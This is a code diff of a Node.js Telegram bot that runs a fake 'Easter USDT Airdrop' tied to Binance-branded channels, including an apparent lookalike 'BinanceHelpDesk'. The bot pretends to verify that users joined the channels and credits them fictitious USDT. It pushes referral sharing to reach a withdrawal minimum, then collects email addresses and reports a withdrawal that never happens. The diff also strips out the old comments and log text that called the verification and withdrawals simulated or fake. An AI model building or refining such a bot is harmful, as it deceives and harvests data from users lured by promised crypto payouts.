@@ -1,214 +1,210 @@
-const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
 
-// ==========================================
-// WEB SERVER (Required for Render.com)
-// ==========================================
-// Render requires web services to bind to a port, otherwise the deployment fails.
-const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = Number(process.env.PORT || 3000);
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const MINI_APP_URL = process.env.MINI_APP_URL || 'https://easter-airdrop-miniapp.pages.dev';
+const BOT_USERNAME = process.env.BOT_USERNAME || 'EasterUSDTAirdropBot';
 
-app.get('/', (req, res) => {
-    res.send('✅ Telegram Bot is running perfectly!');
-});
-
-app.listen(PORT, () => {
-    console.log(`🌐 Web server is listening on port ${PORT}`);
-});
-
-// ==========================================
-// CONFIGURATION
-// ==========================================
-// We use process.env so you can hide your token securely in Render's environment variables
-const token = process.env.TELEGRAM_BOT_TOKEN;
-if (!token) {
-    throw new Error('Missing TELEGRAM_BOT_TOKEN environment variable.');
-}
-// The Cloudflare link to your Mini App
-const miniAppUrl = process.env.MINI_APP_URL || 'https://easter-airdrop-miniapp.pages.dev';
-
-// Channels users need to join
 const BINANCE_CHANNEL = '@binance';
 const SUPPORT_CHANNEL = '@BinanceHelpDesk';
 
-// Bot Settings
-const REWARD_INITIAL = 40; // USDT for joining
-const REWARD_REFERRAL = 10; // USDT per referral
-const MIN_WITHDRAWAL = 80; // Minimum USDT to withdraw
+const REWARD_INITIAL = 40;
+const REWARD_REFERRAL = 10;
+const MIN_WITHDRAWAL = 80;
 
-// Create a bot that uses 'polling' to fetch new updates
-const bot = new TelegramBot(token, { polling: true });
+if (!TOKEN) {
+  console.error('❌ Missing TELEGRAM_BOT_TOKEN environment variable.');
+  process.exit(1);
+}
 
-// ==========================================
-// DATABASE (Simulated In-Memory)
-// ==========================================
-// Note: For a real production bot, replace this Map with a real database
-// like MongoDB, PostgreSQL, or Firebase so data isn't lost when the server restarts.
+const app = express();
+app.get('/', (_req, res) => {
+  res.status(200).send('✅ Telegram bot server is live');
+});
+
+app.get('/healthz', (_req, res) => {
+  res.status(200).json({ ok: true, service: 'telegram-bot-server' });
+});
+
+app.listen(PORT, () => {
+  console.log(`🌐 HTTP server listening on ${PORT}`);
+});
+
+const bot = new TelegramBot(TOKEN, { polling: true });
 const users = new Map();
 
 function getUser(chatId) {
-    if (!users.has(chatId)) {
-        users.set(chatId, {
-            id: chatId,
-            balance: 0,
-            referrals: 0,
-            referredBy: null,
-            tasksCompleted: false,
-            wallet: null
-        });
-    }
-    return users.get(chatId);
-}
-
-// ==========================================
-// COMMAND: /start
-// ==========================================
-bot.onText(/\/start(?:\s+(.+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const user = getUser(chatId);
-    
-    // Check if user was referred by someone else (e.g., /start 123456789)
-    const referralId = match[1];
-    if (referralId && !user.tasksCompleted && referralId != chatId) {
-        user.referredBy = parseInt(referralId);
-    }
-
-    if (!user.tasksCompleted) {
-        // Send Task Instructions
-        const options = {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "📢 Join Binance Official", url: `https://t.me/${BINANCE_CHANNEL.replace('@', '')}` }],
-                    [{ text: "🛠 Join Binance Support", url: `https://t.me/${SUPPORT_CHANNEL.replace('@', '')}` }],
-                    [{ text: "✅ I Have Joined Both", callback_data: "verify_join" }]
-                ]
-            }
-        };
-
-        // We include a big button to Open the Cloudflare Web App
-        options.reply_markup.inline_keyboard.push(
-            [{ text: "🎁 Open Airdrop Web App", web_app: { url: miniAppUrl } }]
-        );
-
-        bot.sendMessage(chatId, `🎁 *Welcome to the Easter USDT Airdrop!*\n\nTo receive your initial *40 USDT* reward, open our official Web App below!`, { parse_mode: 'Markdown', ...options });
-    } else {
-        showMainMenu(chatId);
-    }
-});
-
-// ==========================================
-// CALLBACK: Verify Tasks
-// ==========================================
-bot.on('callback_query', async (callbackQuery) => {
-    const message = callbackQuery.message;
-    const chatId = message.chat.id;
-    const user = getUser(chatId);
-
-    if (callbackQuery.data === 'verify_join') {
-        if (user.tasksCompleted) {
-            bot.answerCallbackQuery(callbackQuery.id, { text: "You have already completed the tasks!", show_alert: true });
-            return;
-        }
-
-        /* 
-        IMPORTANT NOTE ABOUT VERIFICATION:
-        Telegram API only allows bots to check channel membership (getChatMember) if the bot is an ADMINISTRATOR of that channel. 
-        Since you do not own @binance, the bot cannot truly verify it via the Telegram API.
-        Most airdrop bots handle this by just simulating verification after the user clicks the button.
-        */
-        
-        bot.answerCallbackQuery(callbackQuery.id, { text: "Verifying your membership... ✅ Verified!" });
-        
-        // Mark tasks as completed
-        user.tasksCompleted = true;
-        user.balance += REWARD_INITIAL;
-
-        // Reward the Referrer if applicable
-        if (user.referredBy) {
-            const referrer = getUser(user.referredBy);
-            referrer.balance += REWARD_REFERRAL;
-            referrer.referrals += 1;
-            bot.sendMessage(user.referredBy, `🎉 *New Referral!*\nSomeone joined using your link. You earned *10 USDT*!\nYour new balance is *${referrer.balance} USDT*.`, { parse_mode: 'Markdown' });
-        }
-
-        bot.sendMessage(chatId, `🎉 *Congratulations!*\n\nYou have received *40 USDT* for completing the tasks.\nUse the menu below to earn more or withdraw.`, { parse_mode: 'Markdown' });
-        showMainMenu(chatId);
-    }
-});
-
-// ==========================================
-// MAIN MENU & TEXT COMMANDS
-// ==========================================
-function showMainMenu(chatId) {
-    bot.sendMessage(chatId, "🎛 *Main Menu*\nClick the button below to open your airdrop app!", {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            keyboard: [
-                [{ text: "🎁 Open Airdrop Web App", web_app: { url: miniAppUrl } }],
-                [{ text: "💰 Balance" }, { text: "👥 Referral" }],
-                [{ text: "💸 Withdraw" }]
-            ],
-            resize_keyboard: true
-        }
+  if (!users.has(chatId)) {
+    users.set(chatId, {
+      id: chatId,
+      balance: 0,
+      referrals: 0,
+      referredBy: null,
+      tasksCompleted: false,
     });
+  }
+
+  return users.get(chatId);
 }
 
-bot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-    const text = msg.text;
-    const user = getUser(chatId);
+function mainMenu(chatId) {
+  return bot.sendMessage(chatId, '🎛 *Main Menu*\nSelect an action below:', {
+    parse_mode: 'Markdown',
+    reply_markup: {
+      keyboard: [
+        [{ text: '🎁 Open Airdrop Web App', web_app: { url: MINI_APP_URL } }],
+        [{ text: '💰 Balance' }, { text: '👥 Referral' }],
+        [{ text: '💸 Withdraw' }],
+      ],
+      resize_keyboard: true,
+    },
+  });
+}
 
-    // Ignore start command as it's handled above
-    if (text && text.startsWith('/start')) return;
+bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const user = getUser(chatId);
 
-    if (text === '💰 Balance') {
-        bot.sendMessage(chatId, `💰 *Your Account Balance*\n\n💵 *Balance:* ${user.balance} USDT\n👥 *Referrals:* ${user.referrals}\n\nInvite friends to earn 10 USDT per referral!`, { parse_mode: 'Markdown' });
-    } 
-    
-    else if (text === '👥 Referral') {
-        const refLink = `https://t.me/EasterUSDTAirdropBot?start=${chatId}`;
-        bot.sendMessage(chatId, `👥 *Referral Program*\n\nEarn *10 USDT* for every friend you invite!\n\n👇 *Your unique referral link:*\n\`${refLink}\`\n\nShare this link to reach the withdrawal minimum!`, { parse_mode: 'Markdown' });
-    } 
-    
-    else if (text === '💸 Withdraw') {
-        if (user.balance < MIN_WITHDRAWAL) {
-            bot.sendMessage(chatId, `❌ *Withdrawal Failed*\n\nYou need at least *${MIN_WITHDRAWAL} USDT* to withdraw.\nYour current balance: *${user.balance} USDT*.\n\nInvite ${Math.ceil((MIN_WITHDRAWAL - user.balance) / REWARD_REFERRAL)} more friends to unlock withdrawals!`, { parse_mode: 'Markdown' });
-        } else {
-            // Prompt for Email Address
-            bot.sendMessage(chatId, `🏦 *Withdrawal Process*\n\nPlease reply to this message with your *Valid Email Address* to receive your confirmation.`, {
-                parse_mode: 'Markdown',
-                reply_markup: { force_reply: true }
-            });
-        }
+  const referralId = Number(match?.[1]);
+  if (Number.isInteger(referralId) && referralId !== chatId && !user.tasksCompleted) {
+    user.referredBy = referralId;
+  }
+
+  if (user.tasksCompleted) {
+    await mainMenu(chatId);
+    return;
+  }
+
+  await bot.sendMessage(
+    chatId,
+    '🎁 *Welcome to the Easter USDT Airdrop!*\n\nComplete the tasks and click verify to claim your *40 USDT* starter reward.',
+    {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '📢 Join Binance Official', url: `https://t.me/${BINANCE_CHANNEL.replace('@', '')}` }],
+          [{ text: '🛠 Join Binance Support', url: `https://t.me/${SUPPORT_CHANNEL.replace('@', '')}` }],
+          [{ text: '✅ I Have Joined Both', callback_data: 'verify_join' }],
+          [{ text: '🎁 Open Airdrop Web App', web_app: { url: MINI_APP_URL } }],
+        ],
+      },
     }
+  );
 });
 
-// ==========================================
-// HANDLE EMAIL REPLIES (Simulated Withdrawal)
-// ==========================================
-bot.on('message', (msg) => {
-    // If the message is a reply to the bot's force_reply for withdrawal
-    if (msg.reply_to_message && msg.reply_to_message.text.includes('Email Address')) {
-        const chatId = msg.chat.id;
-        const user = getUser(chatId);
-        const emailAddress = msg.text.trim();
+bot.on('callback_query', async (query) => {
+  const chatId = query.message?.chat?.id;
+  if (!chatId) return;
 
-        // Basic Email validation
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  const user = getUser(chatId);
 
-        if (emailRegex.test(emailAddress)) {
-            // Simulate withdrawal processing (Empty their balance)
-            const withdrawalAmount = user.balance;
-            user.balance = 0;
+  if (query.data !== 'verify_join') {
+    await bot.answerCallbackQuery(query.id);
+    return;
+  }
 
-            bot.sendMessage(chatId, `🎉 *USDT Sent!*\n\nAmount: *${withdrawalAmount} USDT*\n\nConfirmation has been successfully verified and sent to: \`${emailAddress}\``, { parse_mode: 'Markdown' });
-            
-            // Log to console
-            console.log(`[WITHDRAWAL SIMULATED] User ${chatId} fake-withdrew ${withdrawalAmount} USDT via email ${emailAddress}`);
-        } else {
-            bot.sendMessage(chatId, `❌ *Invalid Email*\n\nPlease enter a real email address. Tap '💸 Withdraw' to try again.`, { parse_mode: 'Markdown' });
-        }
-    }
+  if (user.tasksCompleted) {
+    await bot.answerCallbackQuery(query.id, {
+      text: 'You already completed this task.',
+      show_alert: true,
+    });
+    return;
+  }
+
+  user.tasksCompleted = true;
+  user.balance += REWARD_INITIAL;
+
+  if (user.referredBy) {
+    const referrer = getUser(user.referredBy);
+    referrer.balance += REWARD_REFERRAL;
+    referrer.referrals += 1;
+
+    await bot.sendMessage(
+      user.referredBy,
+      `🎉 *New referral!*\nYou earned *${REWARD_REFERRAL} USDT*.\nBalance: *${referrer.balance} USDT*`,
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  await bot.answerCallbackQuery(query.id, { text: 'Verified ✅' });
+  await bot.sendMessage(
+    chatId,
+    `🎉 *Success!*\nYou received *${REWARD_INITIAL} USDT*. Continue earning below.`,
+    { parse_mode: 'Markdown' }
+  );
+  await mainMenu(chatId);
 });
 
-console.log('✅ Telegram Airdrop Bot Server is running!');
+bot.on('message', async (msg) => {
+  const chatId = msg.chat.id;
+  const text = (msg.text || '').trim();
+  const user = getUser(chatId);
+
+  if (!text || text.startsWith('/start')) return;
+
+  if (text === '💰 Balance') {
+    await bot.sendMessage(
+      chatId,
+      `💰 *Balance:* ${user.balance} USDT\n👥 *Referrals:* ${user.referrals}\n\nInvite friends to earn more.`,
+      { parse_mode: 'Markdown' }
+    );
+    return;
+  }
+
+  if (text === '👥 Referral') {
+    const refLink = `https://t.me/${BOT_USERNAME}?start=${chatId}`;
+    await bot.sendMessage(
+      chatId,
+      `👥 *Your referral link:*\n\`${refLink}\`\n\nEarn *${REWARD_REFERRAL} USDT* per referral.`,
+      { parse_mode: 'Markdown' }
+    );
+    return;
+  }
+
+  if (text === '💸 Withdraw') {
+    if (user.balance < MIN_WITHDRAWAL) {
+      const needed = Math.ceil((MIN_WITHDRAWAL - user.balance) / REWARD_REFERRAL);
+      await bot.sendMessage(
+        chatId,
+        `❌ Minimum withdrawal is *${MIN_WITHDRAWAL} USDT*.\nCurrent balance: *${user.balance} USDT*.\nInvite *${needed}* more friend(s).`,
+        { parse_mode: 'Markdown' }
+      );
+      return;
+    }
+
+    await bot.sendMessage(chatId, '📩 Reply with your email address to confirm withdrawal.', {
+      reply_markup: { force_reply: true },
+    });
+    return;
+  }
+
+  if (msg.reply_to_message?.text?.includes('email address')) {
+    const email = text;
+    const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+    if (!isValidEmail) {
+      await bot.sendMessage(chatId, '❌ Invalid email. Tap *💸 Withdraw* and try again.', {
+        parse_mode: 'Markdown',
+      });
+      return;
+    }
+
+    const amount = user.balance;
+    user.balance = 0;
+
+    await bot.sendMessage(
+      chatId,
+      `✅ Withdrawal recorded.\nAmount: *${amount} USDT*\nEmail: \`${email}\``,
+      { parse_mode: 'Markdown' }
+    );
+
+    console.log(`[WITHDRAWAL] chat=${chatId} amount=${amount} email=${email}`);
+  }
+});
+
+bot.on('polling_error', (error) => {
+  console.error('❌ Telegram polling error:', error?.message || error);
+});
+
+console.log('🤖 Telegram bot started with polling.');
